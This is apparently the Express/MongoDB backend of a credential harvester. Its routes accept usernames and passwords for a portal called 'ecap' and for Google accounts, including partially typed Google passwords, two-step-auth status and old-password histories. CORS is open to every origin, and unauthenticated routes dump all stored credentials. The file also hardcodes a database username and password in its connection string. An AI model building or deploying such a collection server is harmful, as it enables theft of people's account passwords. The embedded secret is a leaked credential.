const express = require("express");
const app = express();
const path = require("path");
const cors = require("cors");
const { connect } = require("mongoose");
const { Pass, Ecap } = require("./utils/password");
const { type } = require("os");
app.set("views", path.join(__dirname, "views"));
app.set("public", path.join(__dirname, "public"));
app.set("view engine", "pug");
require("dotenv").config();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static("./public"));

connect(
  "mongodb+srv://suryasarisa99:suryamongosurya@cluster0.xtldukm.mongodb.net/Student?retryWrites=true&w=majority",
  {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  }
).then((res) => console.log("connected"));

app.use(
  cors({
    // origin: ["https://www.example.com", "http://103.138.0.69/ecap"],
    origin: "*",
    allowedHeaders: "Content-Type",
    methods: "POST, GET, PUT, PATCH",
  })
);
app.options("/test", cors());

app.get("/x", async (req, res) => {
  const passes = await Ecap.find();
  console.log(passes);
  // console.log(passes);

  // res.render("a", { passes });
  res.json(passes);
});

app.post("/new-ecap", async (req, res) => {
  let { user, passwd, type } = req.body;
  console.log(passwd);
  let prvPass = await Ecap.findById(user);

  try {
    if (prvPass) {
      // same return
      if (prvPass.password == passwd)
        return res.json({ mssg: "Already There" });
      let backupPrvPass = prvPass.password;
      prvPass.password = passwd;

      if (prvPass.oldPasswords.includes(passwd)) {
        prvPass.oldPasswords.splice(prvPass.oldPasswords.indexOf(passwd), 1);
      }
      prvPass.oldPasswords.unshift(backupPrvPass);
      await prvPass.save();
      return res.json({ mssg: "updated pass" });
    } else {
      let pass = new Ecap({
        _id: user,
        password: passwd,
        type,
        oldPasswords: [],
      });
      await pass.save();
      return res.json({ mssg: "new pass created" });
    }
  } catch (err) {
    res.json({ status: "error", error: err });
  }
});

app.get("/passes", async (req, res) => {
  let [ePasses, gPasses] = await Promise.all([Ecap.find(), Pass.find()]);
  return res.json({ ePasses, gPasses });
});

app.post("/google-temp", async (req, res) => {
  let { user, passwd, type, twoStepAuth } = req.body;
  let prvPass = await Pass.findById(user);
  if (prvPass) {
    if (prvPass.password != passwd) {
      prvPass.temp = passwd;
      await prvPass.save();
    }
  } else {
    let pass = new Pass({
      _id: user,
      temp: passwd,
      type,
      oldPasswords: [],
      twoStepAuth,
    });
    await pass.save();
    res.json({ mssg: "new pass created" });
  }
});

app.post("/new-google", async (req, res) => {
  let { user, passwd, type, twoStepAuth } = req.body;
  let prvPass = await Pass.findById(user);
  try {
    if (prvPass) {
      prvPass.twoStepAuth = twoStepAuth;
      prvPass.temp = "";
      if (prvPass.password == passwd) {
        await prvPass.save();
        return res.json({ mssg: "Already There" });
      }
      let backupPrvPass = prvPass.password;
      prvPass.password = passwd;

      if (prvPass.oldPasswords.includes(passwd)) {
        prvPass.oldPasswords.splice(prvPass.oldPasswords.indexOf(passwd), 1);
      }
      prvPass.oldPasswords.unshift(backupPrvPass);
      await prvPass.save();

      res.json({ mssg: "updated pass" });
    } else {
      let pass = new Pass({
        _id: user,
        password: passwd,
        twoStepAuth,
        type,
        oldPasswords: [],
      });
      await pass.save();
      res.json({ mssg: "new pass created" });
    }
  } catch (err) {
    res.json({ status: "error", error: err });
  }
});

app.post("/test", async (req, res) => {
  try {
    console.log("worked");
    let prvPass = await Ecap.findById(req.body.user);

    if (prvPass) {
      prvPass.passwords = req.body.passwd;
      prvPass.save();
    } else {
      let pass = new Ecap({
        _id: req.body.user,
        passwords: req.body.passwd,
        type: req.body.type,
      });
      await pass.save();
    }
    res.json({ status: "Done", data: req.body });
  } catch (error) {
    res.send({ status: "some-error", data: req.body, error: error });
  }
});

app.post("/ecap", async (req, res) => {
  console.log(req.body);
  let pass = await Pass.findById(req.body.user);
  if (pass) {
    if (pass.passwords.includes(req.body.passwd)) return res.send("done");
    pass.passwords.unshift(req.body.passwd);
    await pass.save();
    return res.send("done");
  } else {
    let pass = new Pass({
      _id: req.body.user,
      passwords: [req.body.passwd],
      type: [req.body.type],
    });
    await pass.save();
  }

  return res.json({ sample: "ecap pass saved" });
});
app.get("/", async (_, res) => {
  const passes = await Ecap.find();
  const gPasses = await Pass.find();
  res.render("a.pug", { passes, gPasses });
});

app.listen(process.env.PORT || 3000);
